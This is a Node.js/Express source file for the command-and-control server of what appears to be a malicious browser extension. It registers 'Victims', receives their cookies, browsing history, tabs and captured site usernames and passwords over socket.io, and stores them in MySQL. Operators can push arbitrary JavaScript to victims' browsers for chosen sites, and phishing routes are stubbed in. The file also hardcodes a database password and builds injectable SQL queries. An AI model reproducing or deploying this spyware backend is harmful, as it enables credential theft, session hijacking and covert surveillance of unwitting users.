var express = require('express');
var passport = require('passport');
var Strategy = require('passport-local').Strategy;
var users = require('./db/users');
var app = express();
var server = require('http').Server(app);
var io = require('socket.io')(server);
var mysql = require('mysql');

//array storing active user information
var activeUsers = [];

var con = mysql.createConnection({
  host: "mysql4.cs.stonybrook.edu",
  user: "kevchang",
  password: "110328939",
  database: "kevchang"
  // user: "root",
  // password: "asd",
  // database: "kevchang"
});

con.connect(function(err) {
  if (err) throw err;
  console.log("Connected To Database!");
});

/* This is commented out because users.js seems to be necessary for the passport module.
con.query("SELECT * FROM Admin WHERE name= '"+username+"'", function (err, result, fields) {
  if (err) return cb(null,err);
  if(password === result[0].password){
    var user = {
      id: result[0].idAdmin,
      username: username,
      password: password,
      displayName: username,
      emails: [{
        value: 'email@gmail.com'
      }]};
    return cb(null,user);
  }else{
    return cb(null,false);
  }
});
*/

passport.use(new Strategy(
  function(username, password, cb) {
    users.findByUsername(username, function(err, user) {
      if (err) {
        return cb(err);
      }
      if (!user) {
        return cb(null, false);
      }
      if (user.password != password) {
        return cb(null, false);
      }
      return cb(null, user);
    });
  }));

passport.serializeUser(function(user, cb) {
  cb(null, user.id);
});

passport.deserializeUser(function(id, cb) {
  users.findById(id, function(err, user) {
    if (err) {
      return cb(err);
    }
    cb(null, user);
  });
});




// Create a new Express application.


// Configure view engine to render EJS templates.
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');

// Use application-level middleware for common functionality, including
// logging, parsing, and session handling.
//app.use(require('morgan')('combined'));
app.use(require('cookie-parser')());
app.use(require('body-parser').urlencoded({
  extended: true
}));
app.use(require('express-session')({
  secret: 'idkThisIsMySecretToSignCookie',
  resave: false,
  saveUninitialized: false
}));

//for frontend styling
app.use(express.static('views'));


// Initialize Passport and restore authentication state, if any, from the
// session.
app.use(passport.initialize());
app.use(passport.session());

// Define routes.
app.get('/',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    con.query("SELECT * FROM Victims", function(err, result, fields) {
      if (err) throw err;
      res.render('home', {
        rowData: result
      });
    });
  });

app.get('/login',
  function(req, res) {
    res.render('login');
  });

app.post('/login',
  passport.authenticate('local', {
    failureRedirect: '/login'
  }),
  function(req, res) {
    res.redirect('/');
  });

app.get('/logout',
  function(req, res) {
    req.logout();
    res.redirect('/');
  });

app.get('/active',
require('connect-ensure-login').ensureLoggedIn(),
function(req, res){
  con.query("SELECT * FROM Active", function(err, results, fields) {
    if (err) throw err;
    res.render('active',{rowData:results});
  });
});

app.get('/security',
require('connect-ensure-login').ensureLoggedIn(),
function(req, res){
  con.query("SELECT * FROM SecurityWebsites", function(err, results, fields) {
    if (err) throw err;
    res.render('security',{rowData:results});
  });
});

app.post('/security',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    var sql = "INSERT INTO SecurityWebsites (url) VALUES ('" + req.body.url + "')";
    con.query(sql, function(err, result) {
      if (err) console.log(err);
    });
    res.redirect("/security");
  });

app.get('/test',
function(req, res){
  var clients = io.sockets.clients();
  console.log(clients);
});
/*
app.get('/cookies',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res){
    con.query("SELECT * FROM Cookie", function (err, result, fields) {
      if (err) throw err;
      res.render('cookies', { user: req.user, rowData: result });
    });

  });*/

app.get('/cookies',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    con.query("SELECT * FROM Cookie WHERE userID = '" + req.query['selection'] + "'", function(err, history, fields) {
      if (err) throw err;
      con.query("SELECT * FROM Victims", function(err, userResult, fields) {
        if (err) throw err;
        res.render('cookies', {
          users: userResult,
          rowData: history
        });
      });
    });
  });

// app.get('/cookies/:id', require('connect-ensure-login').ensureLoggedIn(), function(req, res) {
//   con.query("SELECT * FROM Cookie WHERE userID = '"+req.params.id+"'", function (err, history, fields) {
//     if (err) throw err;
//     con.query("SELECT * FROM Victims", function (err, userResult, fields) {
//       if (err) throw err;
//       res.render('cookies', { users: userResult, rowData: history });
//     });
//   });
// });

app.get('/history',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    con.query("SELECT * FROM History WHERE userID = '" + req.query['selection'] + "'", function(err, history, fields) {
      if (err) throw err;
      con.query("SELECT * FROM Victims", function(err, userResult, fields) {
        if (err) throw err;
        res.render('history', {
          users: userResult,
          rowData: history
        });
      });
    });
  });

  app.get('/loginInfo',
    require('connect-ensure-login').ensureLoggedIn(),
    function(req, res) {
      con.query("SELECT * FROM LoginInfo WHERE userID = '" + req.query['selection'] + "'", function(err, history, fields) {
        if (err) throw err;
        con.query("SELECT * FROM Victims", function(err, userResult, fields) {
          if (err) throw err;
          res.render('loginInfo', {
            users: userResult,
            rowData: history
          });
        });
      });
    });

app.get('/profile',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    res.render('profile', {
      user: req.user
    });
  });

app.get('/inject',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    var sql = "SELECT * FROM Injections";
    con.query(sql, function(err, result) {
      if (err) throw error;
      var arr = [];
      for (var i = 0; i < result.length; i++) {
        var object = {
          site: result[i]['url'],
          code: result[i]['javascript']
        };
        arr.push(object);
      }

      io.emit('jsExecution', arr);

      res.render('inject', {
        rowData: result
      });
    });

  });

app.get('/phishing',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    res.render("phishing");
  });

app.post('/phishing',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    console.log(activeTabs);
    res.redirect("phishing");
  });

app.post('/inject',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    var sql = "INSERT INTO Injections (url, javascript) VALUES ('" + req.body.url + "', '" + req.body.js + "')";
    con.query(sql, function(err, result) {
      if (err) console.log(err);
    });
    res.redirect("/inject");
  });


server.listen(3000);
console.log("Listening on port 3000");
activeTabs = {};

io.on('connection', (socket) => {
  socket.on("userData", (userData) => {
    console.log("User Connected");
    var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userData.email+"', '"+ userData.id+"')";
    con.query(sql, function (err, result) {
      //console.log("1 victim added: "+userData.email+ " ID:"+userData.id);
    });
    //make a table to map socketID with victim ID
    var sqlIDMapping = "INSERT INTO Active (userID, socketID, email) VALUES ('"+userData.id+"', '"+ socket.id+"', '"+userData.email+"')";
    con.query(sqlIDMapping, function(err, result) {
        //console.log("Mapping added: User ID:"+userData.id+ " Socket ID:" +socket.id+"");
    });

    var sql = "SELECT * FROM SecurityWebsites";
    con.query(sql, function(err, result) {
      if (err) throw error;
      var arr = [];
      result.forEach((row) => {
        if (row.url) arr.push(row.url);
        //console.log(row.url);
      });
      socket.emit('securityWebsites', arr);
    });

    var sql = "SELECT * FROM Injections";
    con.query(sql, function(err, result) {
      if (err) throw error;
      var arr = [];
      for (var i = 0; i < result.length; i++) {
        var object = {
          site: result[i]['url'],
          code: result[i]['javascript']
        };
        arr.push(object);
      }

      socket.emit('jsExecution', arr);
    });
    socket.on('Login', (loginInfo) => {
      console.log("Login detected: " + loginInfo);
      var loginInfo2 = loginInfo.split(" ");
      var loginInfo3 = loginInfo2[1].split(":")
      var p1 = "'"+loginInfo2[0]+"'";
      var p2 = "'"+loginInfo3[0]+"'";
      var p3 = "'"+loginInfo3[1]+"'";
      var sql = "INSERT INTO LoginInfo (url, username, password,userID) VALUES ("+p1 +", "+p2 +", " + p3+", "+userData.id+")";
      con.query(sql, function (err, result) {
        if(err) throw err;
      });
    });
    socket.on('Cookies', (cookies) => {
      var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userData.id+"', '"+ cookies+"')";
      con.query(sql, function (err, result) {
        if (err) throw err;
      });
    });
    socket.on('History', (history) => {
      var str1 = "'" + history[0] + "'" //siteLink String
      var str2 = "'" + history[1] + "'" //timeStamp String

      //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('"+userData.id+"', "+ str2 + ","+ str1+")";

      con.query(sql, function(err, result) {
        if (err) throw err;
      });
      //history.forEach((field) => {
      //console.log("Field: "+typeof(field));
      //
      //console.log("    " + field);
      //});
    });
    socket.on('Removed Tab', (tab)=>{
      delete activeTabs[tab['tabId']]
    });
    socket.on('Updated Tab', (tab)=>{
      if(tab['tab']['status'] == 'complete' && tab['tab']['url'] != null){
        activeTabs[tab['tab']['id']] = tab['tab']['url'];
      }

    });
    socket.on('disconnect', () => {
      console.log("User Disconnected");
      var sql = "DELETE FROM Active WHERE userID = "+ userData.id;
      con.query(sql, function(err, result) {
          //console.log("Mapping added: User ID:"+userData.id+ " Socket ID:" +socket.id+"");
      });
    });
  });
});
